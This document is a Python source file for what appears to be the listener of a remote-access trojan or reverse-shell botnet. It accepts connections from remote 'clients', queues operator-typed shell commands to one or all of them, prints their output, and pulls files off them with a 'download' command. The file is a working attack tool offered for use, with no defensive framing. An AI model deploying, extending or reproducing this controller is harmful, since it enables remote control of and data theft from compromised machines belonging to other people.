import socket
import threading
import queue
import time
from typing import Dict, Optional

class ClientHandler:
    def __init__(self, client_socket: socket.socket, address: str, client_id: int):
        self.client = client_socket
        self.address = address
        self.client_id = client_id
        self.is_connected = True
        self.command_queue = queue.Queue()
        self.response_queue = queue.Queue()
        self.last_seen = time.time()

    def check_connection(self) -> bool:
        """Check if client is still connected"""
        try:
            # Send empty string to check connection
            self.client.send(b'')
            self.last_seen = time.time()
            return True
        except (ConnectionResetError, BrokenPipeError, OSError):
            self.is_connected = False
            return False

    def handle_download(self, cmd: str) -> str:
        try:
            response = self.client.recv(1024).decode()
            if response == 'FILE_TRANSFER_START':
                file_name = cmd.split(' ', 1)[1].strip().split('/')[-1]
                with open(f'client_{self.client_id}_{file_name}', 'wb') as f:
                    while True:
                        chunk = self.client.recv(4096)
                        if b'FILE_TRANSFER_END' in chunk:
                            f.write(chunk.replace(b'FILE_TRANSFER_END', b''))
                            break
                        f.write(chunk)
                return f'[+] File {file_name} downloaded successfully'
            return f'[-] {response}'
        except (ConnectionResetError, BrokenPipeError, OSError):
            self.is_connected = False
            return "[-] Connection lost during file transfer"

    def handle_client(self):
        """Handle individual client communications"""
        try:
            self.client.send(b'connected')
        except (ConnectionResetError, BrokenPipeError, OSError):
            self.is_connected = False
            return

        while self.is_connected:
            try:
                cmd = self.command_queue.get(timeout=0.1)
                if not self.check_connection():
                    break

                self.client.send(cmd.encode())

                if cmd.lower() in ['q', 'quit', 'x', 'exit']:
                    break

                if cmd.startswith('download'):
                    result = self.handle_download(cmd)
                else:
                    try:
                        result = self.client.recv(1024).decode()
                        self.last_seen = time.time()
                    except (ConnectionResetError, BrokenPipeError, OSError):
                        self.is_connected = False
                        result = "[-] Connection lost"
                
                self.response_queue.put(result)
                
            except queue.Empty:
                # Periodically check connection
                if time.time() - self.last_seen > 5:  # Check every 5 seconds
                    if not self.check_connection():
                        break
                continue
            except (ConnectionResetError, BrokenPipeError, OSError):
                self.is_connected = False
                break

        self.is_connected = False
        try:
            self.client.close()
        except:
            pass

class MultiClientServer:
    def __init__(self, host: str, port: int):
        self.server = socket.socket()
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind((host, port))
        self.server.listen(5)
        self.clients: Dict[int, ClientHandler] = {}
        self.next_client_id = 1
        self.running = True
        self.cleanup_thread = threading.Thread(target=self.periodic_cleanup)
        self.cleanup_thread.daemon = True
        self.cleanup_thread.start()

    def print_banner(self):
        """Print server banner with available commands"""
        print("\n" + "="*50)
        print("Available commands:")
        print("list   - List connected clients")
        print("select <id> - Select a specific client")
        print("all    - Send command to all clients")
        print("quit   - Exit server")
        print("="*50)

    def periodic_cleanup(self):
        """Periodically check and clean up disconnected clients"""
        while self.running:
            self.cleanup_disconnected()
            time.sleep(1)  # Check every second

    def cleanup_disconnected(self):
        """Remove disconnected clients from the clients dictionary"""
        disconnected = []
        for cid, client in self.clients.items():
            if not client.is_connected:
                disconnected.append(cid)
                try:
                    client.client.close()
                except:
                    pass
                print(f"\n[-] Client {cid} disconnected")

        for cid in disconnected:
            del self.clients[cid]

    def accept_clients(self):
        """Accept new client connections"""
        while self.running:
            try:
                client_socket, address = self.server.accept()
                client_handler = ClientHandler(client_socket, address, self.next_client_id)
                self.clients[self.next_client_id] = client_handler
                
                print(f'\n[+] Client {self.next_client_id} connected from {address}')
                self.print_banner()
                
                client_thread = threading.Thread(target=client_handler.handle_client)
                client_thread.daemon = True
                client_thread.start()
                
                self.next_client_id += 1
            except Exception as e:
                print(f"\n[-] Error accepting client: {e}")

    def list_clients(self) -> str:
        """List all connected clients"""
        if not self.clients:
            return "\nNo clients connected"
        
        result = "\nConnected clients:"
        for cid, client in self.clients.items():
            if client.is_connected:
                result += f"\nClient {cid}: {client.address}"
        return result

    def send_command(self, client_id: Optional[int], cmd: str):
        """Send command to specific client or all clients"""
        if client_id:
            if client_id in self.clients and self.clients[client_id].is_connected:
                self.clients[client_id].command_queue.put(cmd)
            else:
                print(f"\n[-] Client {client_id} not found or disconnected")
        else:
            for client in self.clients.values():
                if client.is_connected:
                    client.command_queue.put(cmd)

    def get_responses(self, client_id: Optional[int], timeout: float = 2.0) -> bool:
        """Get responses from specific client or all clients with timeout"""
        start_time = time.time()
        got_response = False

        while time.time() - start_time < timeout:
            if client_id:
                if client_id in self.clients and self.clients[client_id].is_connected:
                    try:
                        response = self.clients[client_id].response_queue.get_nowait()
                        print(f"\nClient {client_id}: {response}")
                        got_response = True
                    except queue.Empty:
                        time.sleep(0.1)
            else:
                all_empty = True
                for cid, client in self.clients.items():
                    if client.is_connected:
                        try:
                            response = client.response_queue.get_nowait()
                            print(f"\nClient {cid}: {response}")
                            got_response = True
                            all_empty = False
                        except queue.Empty:
                            continue
                if all_empty:
                    time.sleep(0.1)

        return got_response

    def handle_single_client(self, client_id: int):
        """Handle interaction with a single client"""
        print(f"\n[*] Sending commands to client {client_id}")
        print("Type 'back' or 'return' to return to main menu")
        
        while True:
            try:
                cmd = input(f'\nClient {client_id} >>> ').strip()
                if cmd.lower() in ['back', 'return']:
                    break
                
                print()  # Add spacing before command output
                self.send_command(client_id, cmd)
                if not self.get_responses(client_id):
                    print("\n[-] No response received from client")
                
            except KeyboardInterrupt:
                break

    def run(self):
        """Main server loop"""
        accept_thread = threading.Thread(target=self.accept_clients)
        accept_thread.daemon = True
        accept_thread.start()

        print(f'\n[*] Server started - waiting for connections')
        self.print_banner()
        
        while True:
            try:
                cmd = input("\n>>> ").strip()
                
                if cmd.lower() == 'quit':
                    break
                elif cmd.lower() == 'list':
                    self.cleanup_disconnected()  # Force cleanup before listing
                    print(self.list_clients())
                elif cmd.lower().startswith('select'):
                    try:
                        client_id = int(cmd.split()[1])
                        if client_id not in self.clients:
                            print(f"\n[-] Client {client_id} not found")
                            continue
                        if not self.clients[client_id].is_connected:
                            print(f"\n[-] Client {client_id} is disconnected")
                            continue
                        self.handle_single_client(client_id)
                        self.print_banner()
                    except (IndexError, ValueError):
                        print("\n[-] Invalid client ID")
                elif cmd.lower() == 'all':
                    self.cleanup_disconnected()  # Force cleanup before broadcasting
                    if not self.clients:
                        print("\n[-] No connected clients")
                        continue
                    print("\n[*] Sending command to all clients")
                    cmd = input('All clients >>> ').strip()
                    print()  # Add spacing before command output
                    self.send_command(None, cmd)
                    if not self.get_responses(None):
                        print("\n[-] No responses received from clients")
                else:
                    print("\n[-] Unknown command")
                    self.print_banner()
                
            except KeyboardInterrupt:
                break

        # Cleanup
        print("\n[*] Shutting down server...")
        self.running = False
        for client in self.clients.values():
            if client.is_connected:
                try:
                    client.client.close()
                except:
                    pass
        self.server.close()

if __name__ == "__main__":
    SERVER = "10.184.15.72"  # Replace with your server IP
    PORT = 4040             # Replace with your desired port
    
    server = MultiClientServer(SERVER, PORT)
    server.run()